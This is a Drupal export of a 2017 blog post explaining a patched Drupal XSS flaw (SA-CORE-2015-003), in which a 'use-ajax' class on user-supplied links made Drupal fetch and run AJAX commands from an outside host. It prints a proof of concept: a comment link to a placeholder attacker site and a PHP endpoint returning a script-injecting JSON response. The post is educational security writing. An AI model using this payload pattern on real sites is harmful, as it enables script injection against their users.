uuid:
  - value: c14a8828-90f7-48e0-acd6-4b6fe8ce8383
langcode:
  - value: en
type:
  - target_id: blog
    target_type: node_type
    target_uuid: a90c00e7-fd49-42a6-8cdb-e99ec16f7742
revision_timestamp:
  - value: '2020-01-27T17:48:12+00:00'
    format: 'Y-m-d\TH:i:sP'
revision_uid:
  - target_type: user
    target_uuid: 30bffdc0-96b3-4656-9078-3f8113359c60
revision_log: {  }
status:
  - value: true
uid:
  - target_type: user
    target_uuid: 30bffdc0-96b3-4656-9078-3f8113359c60
title:
  - value: 'Getting creative with Drupal XSS'
created:
  - value: '2017-05-28T15:52:44+00:00'
    format: 'Y-m-d\TH:i:sP'
changed:
  - value: '2020-01-27T17:48:12+00:00'
    format: 'Y-m-d\TH:i:sP'
promote:
  - value: true
sticky:
  - value: false
default_langcode:
  - value: true
revision_translation_affected:
  - value: true
path:
  - alias: /blog/getting-creative-drupal-xss
    langcode: en
    pathauto: 1
body:
  - value: |
      <p>In the world of web security, cross-site scripting (XSS) vulnerabilities are extremely common, and will continue to be a problem as web applications become increasingly complex. According to a 2016 report by Bugcrowd, a popular bug bounty site,&nbsp;<strong>‚ÄúXSS vulnerabilities account for 66% of valid submissions, followed by 20% categorized as CSRF‚Äù</strong>&nbsp;(<a href="https://pages.bugcrowd.com/hubfs/PDFs/state-of-bug-bounty-2016.pdf">source</a>). That same report goes into some detail about the severity of XSS (page 23), which is worth reading to understand the scope of this kind of attack.</p>

      <p>Drupal developers are mostly protected from XSS by the HTML filtering system, but custom code can still allow attacks using unconventional exploits.</p>

      <p>For a simple web application, finding an XSS vulnerability may seem trivial. Looking at online resources, you often find code snippets like this:</p>

      <figure>
      <pre>
      <code data-lang="php">&lt;h2&gt;Search results for "&lt;?php echo $_GET['q']; ?&gt;":&lt;/h2&gt;</code></pre>
      </figure>

      <p>but now-a-days, finding an exploit this obvious is unlikely, unless you‚Äôre looking at something completely hand-built. Drupal 8 makes code like this is even more unlikely, given that the templating system has moved to Twig, which escapes output by default and does not allow arbitrary PHP statements.</p>

      <p>So what kind of Drupal code can trigger XSS? Let‚Äôs look at a practical example based on&nbsp;<a href="https://www.drupal.org/SA-CORE-2015-003">SA-CORE-2015-003</a>, which was a security release I helped out on.</p>

      <p><em>Note: The following exploit has already been fixed, don‚Äôt freak out!</em></p>

      <p>Drupal has an internal AJAX system that responds to events on HTML elements, reaching out to a JSON endpoint to perform what‚Äôs known as AJAX commands. An example of this is the autocomplete element, which triggers AJAX requests as a user types to determine autocomplete suggestions.</p>

      <p>You can enhance your HTML elements with this behavior like so:</p>

      <figure>
      <pre>
      <code data-lang="javascript">Drupal.ajax({
        url: '/foo',
        event: 'click',
        element: $('#my-great-link'),
      });</code></pre>
      </figure>

      <p>but to make things easier for developers, Drupal will automatically bind AJAX behaviors to any element with the ‚Äúuse-ajax‚Äù class. This may not seem like a big deal, but many Drupal sites allow users to input HTML, and classes are often allowed in default text filters.</p>

      <p>To re-cap, this is what we know at this point:</p>

      <ol>
      	<li>Drupal allows users to enter HTML by default in areas like comments</li>
      	<li>The XSS filtering in Drupal is really good, so assume we can‚Äôt bypass it</li>
      	<li>The class attribute is allowed in the default text filter</li>
      	<li>The AJAX system automatically binds on elements with the ‚Äúuse-ajax‚Äù class</li>
      </ol>

      <p>Knowing this, we can make a comment like this:</p>

      <figure>
      <pre>
      <code data-lang="html">&lt;a href="http://mynastysite.com/xss.php" class="use-ajax"&gt;Click me!&lt;/a&gt;</code></pre>
      </figure>

      <p>and know that when the link is clicked, a POST request is made to an arbitrary URL, and Drupal will parse the response and process AJAX commands.</p>

      <p>The xss.php script on our endpoint could look something like this:</p>

      <figure>
      <pre>
      <code data-lang="php">&lt;?php

      // Only display the spoof response if the method is POST, this way normal users
      // (i.e. non-admins) will see a normal page.
      if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Allow any site to make a POST request here.
        header('Access-Control-Allow-Origin: *');
        // Form a bare-bones JSON response for Drupal.
        $foo = new stdClass();
        $foo-&gt;command = 'insert';
        $foo-&gt;data = '&lt;script&gt;alert("xss")&lt;/script&gt;';
        $foo-&gt;method = 'append';
        $foo-&gt;selector = 'body';
        echo json_encode(array($foo));
      }
      // Display the normal page for GET requests.
      else {
        echo "&lt;h1&gt;This is a normal site!&lt;/h1&gt;";
      }</code></pre>
      </figure>

      <p>Now when a user clicks our link, we can execute arbitrary Javascript in Drupal!</p>

      <p>The Drupal security team has since improved the AJAX system by adding two layers of defense:</p>

      <ol>
      	<li>When an AJAX-enabled element triggers its event (i.e. is clicked), Drupal verifies that the URL is local before making the request (see&nbsp;<a href="http://cgit.drupalcode.org/drupal/tree/core/misc/drupal.js?id=d5d37e06490825d10c52545433773e22fe6b61fb#n146">Drupal.url.isLocal</a>).</li>
      	<li>If a response does not contain a X-Drupal-Ajax-Token header, it is not processed. This prevents users from making local requests to uploaded files (see&nbsp;<a href="http://cgit.drupalcode.org/drupal/tree/core/misc/ajax.js?id=d5d37e06490825d10c52545433773e22fe6b61fb#n220">Drupal.Ajax.options.success</a>).</li>
      </ol>

      <p>This has been fixed for about two years, but it‚Äôs a great example of how complex XSS vulnerabilities in Drupal can be.</p>

      <p>My biggest takeaway from this is that&nbsp;<em>you don‚Äôt need to bypass the XSS filter to trigger XSS.</em>&nbsp;Get creative with your research, and don‚Äôt hope to find quick-win exploits in code like:</p>

      <figure>
      <pre>
      <code data-lang="twig">{{ twig_input | raw }}</code></pre>
      </figure>

      <p>because it‚Äôs unlikely that you‚Äôll get that lucky. üòÅ</p>
    format: full_html
    summary: ''
field_tags:
  - target_type: taxonomy_term
    target_uuid: d9871794-7262-415a-a18e-fc784794b1c9
  - target_type: taxonomy_term
    target_uuid: e30b1fff-0abe-4d0d-9ea9-6d81ed242109
